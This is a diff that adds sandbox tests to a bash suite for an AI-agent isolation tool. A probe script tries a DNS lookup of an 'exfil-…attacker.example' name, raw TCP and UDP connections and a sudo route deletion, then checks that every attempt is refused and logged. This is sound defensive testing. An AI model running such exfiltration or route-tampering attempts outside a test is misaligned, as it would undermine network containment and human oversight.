@@ -175,6 +175,57 @@ else
   bad "egress log written into the agent folder (DENY recorded)" "$(ls -la "$AH4" 2>&1)"
 fi
 
+echo "network sink (attempts that bypass the proxy are refused and logged):"
+# Needs no internet: every attempt is refused inside the agent's network namespace. The name
+# looked up is unique per case, so a DNS line for it can only come from this probe.
+cat > "$WS/sink_probe.py" <<'PY'
+import socket, sys, time
+try:
+    socket.getaddrinfo("exfil-%s.attacker.example" % sys.argv[1], 443); print("DNS_RESOLVED")
+except socket.gaierror:
+    print("DNS_REFUSED")
+s = socket.socket(); s.settimeout(10); t = time.time()
+try:
+    s.connect(("1.2.3.4", 443)); print("TCP_CONNECTED")
+except OSError:
+    print("TCP_REFUSED_IN %.1f" % (time.time() - t))
+socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"x", ("9.9.9.9", 53))
+print("PROBE_DONE")
+PY
+SINKS_BEFORE=$(podman ps -aq --filter label=agentdev.sink | wc -l)
+# sink_case LABEL NETWORK_JSON HOME - run the probe, then check its output and the egress log.
+sink_case() {
+  local label="$1" net="$2" home="$3" name="n$RANDOM$RANDOM" out log
+  out=$(adev "{\"network\":$net,\"mounts\":{\"agent_folder\":\"$home\"}}" -- bash -lc "
+    python3 /ws/sink_probe.py $name
+    sudo -n ip route del local default dev lo 2>/dev/null && echo ROUTE_CHANGED || echo ROUTE_LOCKED
+    curl -sS -m 8 https://denied.example.org >/dev/null 2>&1; true")
+  log="$home/agentdev-egress.log"
+  grep -q PROBE_DONE <<<"$out" || { bad "$label: probe ran" "$out"; return; }
+  grep -q DNS_REFUSED <<<"$out" && ok "$label: a lookup of an outside name fails" || bad "$label: a lookup of an outside name fails" "$out"
+  grep -qP "\tDENY\tDNS\texfil-$name\.attacker\.example\tA$" "$log" 2>/dev/null \
+    && ok "$label: the looked-up name is in the egress log" || bad "$label: the looked-up name is in the egress log" "$(cat "$log" 2>&1)"
+  if [[ "$(grep -oP 'TCP_REFUSED_IN \K[0-9.]+' <<<"$out")" =~ ^[0-2]\. ]]; then
+    ok "$label: a direct TCP connection fails at once"
+  else
+    bad "$label: a direct TCP connection fails at once" "$out"
+  fi
+  grep -qP '\tDENY\tTCP\t1\.2\.3\.4:443\t' "$log" 2>/dev/null \
+    && ok "$label: the direct TCP attempt is in the egress log" || bad "$label: the direct TCP attempt is in the egress log" "$(cat "$log" 2>&1)"
+  grep -qP '\tDENY\tUDP\t9\.9\.9\.9:53\t' "$log" 2>/dev/null \
+    && ok "$label: the UDP attempt is in the egress log" || bad "$label: the UDP attempt is in the egress log" "$(cat "$log" 2>&1)"
+  grep -q ROUTE_LOCKED <<<"$out" && ok "$label: the agent cannot change the sink's routes, even as root" \
+    || bad "$label: the agent cannot change the sink's routes, even as root" "$out"
+}
+sink_case "allowlist" '{"mode":"allowlist","allow":["api.anthropic.com"],"log":true}' "$ROOT/home-sink-allow"
+grep -qP '\tDENY\tCONNECT\tdenied\.example\.org:443' "$ROOT/home-sink-allow/agentdev-egress.log" 2>/dev/null \
+  && ok "allowlist: the proxy is still reached from the sink's namespace" \
+  || bad "allowlist: the proxy is still reached from the sink's namespace" "$(cat "$ROOT/home-sink-allow/agentdev-egress.log" 2>&1)"
+sink_case "none + log" '{"mode":"none","log":true}' "$ROOT/home-sink-none"
+[[ "$(podman ps -aq --filter label=agentdev.sink | wc -l)" -le "$SINKS_BEFORE" ]] \
+  && ok "every sink is removed when its run ends" || bad "every sink is removed when its run ends" "$(podman ps -a --filter label=agentdev.sink)"
+rm -f "$WS/sink_probe.py"
+
 if [[ "$HAVE_NET" == yes ]]; then
   echo "network isolation:"
   out=$(adev '{"network":{"mode":"none"}}' -- bash -lc 'curl -sS -m 8 https://example.com >/dev/null 2>&1 && echo NET_OK || echo NET_BLOCKED')
